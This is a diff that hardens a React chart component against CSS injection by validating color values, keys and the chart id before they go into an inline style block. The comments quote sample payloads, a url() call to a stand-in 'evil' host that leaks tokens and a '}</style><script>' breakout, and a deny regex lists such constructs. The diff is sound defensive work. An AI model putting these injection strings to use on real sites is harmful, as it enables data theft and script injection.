@@ -58,10 +58,78 @@ const ChartContainer = React.forwardRef<
 });
 ChartContainer.displayName = "Chart";
 
+// ── CSS injection guard (audit 2026-04-19) ───────────────────────────────
+//
+// The style block below is emitted via dangerouslySetInnerHTML; any CSS
+// the input manages to smuggle in becomes active styling. Even a
+// seemingly innocuous value like `red; background: url(//evil/?c=`
+// could break out into new rules or exfiltrate tokens via
+// `background: url(//host/?t={injected})`. Worse, a crafted `color`
+// containing `}</style><script>` would end the style context and
+// inject script when rendered into HTML.
+//
+// Accept only narrow, well-formed CSS color values + identifiers.
+// Anything else is dropped (null) so the chart degrades gracefully
+// rather than rendering attacker CSS.
+
+// CSS <ident-token> (letters/digits/underscore/hyphen). Prefix ASCII
+// letter to avoid the "starts with digit" corner case. This is the
+// same grammar CSS custom property names use.
+const _CSS_IDENT_RE = /^[A-Za-z_-][A-Za-z0-9_-]*$/;
+
+// Allowed CSS color values. Covers:
+//   #abc / #aabbcc / #aabbccff               — hex
+//   rgb(…), rgba(…), hsl(…), hsla(…), oklch(…), oklab(…), color(…), hwb(…)
+//   var(--name)  /  var(--name, fallback-ident)
+//   named colors (red, transparent, currentColor, etc.) + "inherit"/"initial"
+// Whitespace is permitted inside the parens.
+// The inner-parens content is further restricted to chars that cannot
+// close the style tag or open a URL/expression function.
+const _CSS_FN_ARGS = "[A-Za-z0-9_\\-.,%#/\\s]*";
+const _CSS_COLOR_RE = new RegExp(
+  "^(?:" +
+    // hex
+    "#[0-9a-fA-F]{3,8}" +
+    "|" +
+    // functional notation — name + (args) with no nested parens, no <, >, & etc.
+    "(?:rgb|rgba|hsl|hsla|hwb|lab|lch|oklab|oklch|color|hwb)\\(" +
+    _CSS_FN_ARGS +
+    "\\)" +
+    "|" +
+    // var(--name) with optional identifier fallback
+    "var\\(--[A-Za-z0-9_-]+(?:,\\s*[A-Za-z0-9_\\-#.%\\s]+)?\\)" +
+    "|" +
+    // bare identifier (named colors, currentColor, inherit, etc.)
+    "[A-Za-z]+" +
+  ")$"
+);
+
+/** Returns true iff the string is safe to embed inside a `color: ... ;` declaration. */
+function _isSafeCssColor(v: unknown): v is string {
+  if (typeof v !== "string") return false;
+  const s = v.trim();
+  if (s.length === 0 || s.length > 128) return false;
+  // Extra defense: reject anything that could terminate the <style> block
+  // or open URL/expression contexts, regardless of regex outcome.
+  if (/[<>{}"'`\\]|url\s*\(|expression\s*\(|@import|&/i.test(s)) return false;
+  return _CSS_COLOR_RE.test(s);
+}
+
+/** Returns true iff the string is safe to embed as a CSS identifier. */
+function _isSafeCssIdent(v: unknown): v is string {
+  return typeof v === "string" && v.length > 0 && v.length <= 64 && _CSS_IDENT_RE.test(v);
+}
+
 const ChartStyle = ({ id, config }: { id: string; config: ChartConfig }) => {
   const colorConfig = Object.entries(config).filter(([_, config]) => config.theme || config.color);
 
   if (!colorConfig.length) {
+    return null;
+  }
+
+  // Drop the whole block if the chart id itself isn't a safe CSS ident —
+  // otherwise the attribute selector could be broken out of.
+  if (!_isSafeCssIdent(id)) {
     return null;
   }
 
@@ -75,8 +143,14 @@ ${prefix} [data-chart=${id}] {
 ${colorConfig
   .map(([key, itemConfig]) => {
     const color = itemConfig.theme?.[theme as keyof typeof itemConfig.theme] || itemConfig.color;
-    return color ? `  --color-${key}: ${color};` : null;
+    // Validate BOTH the key (used in --color-${key}) and the color value.
+    // Invalid entries are skipped rather than rendered so a single bad
+    // input can't tear down the rest of the block.
+    if (!_isSafeCssIdent(key)) return null;
+    if (!_isSafeCssColor(color)) return null;
+    return `  --color-${key}: ${color};`;
   })
+  .filter(Boolean)
   .join("\n")}
 }
 `,
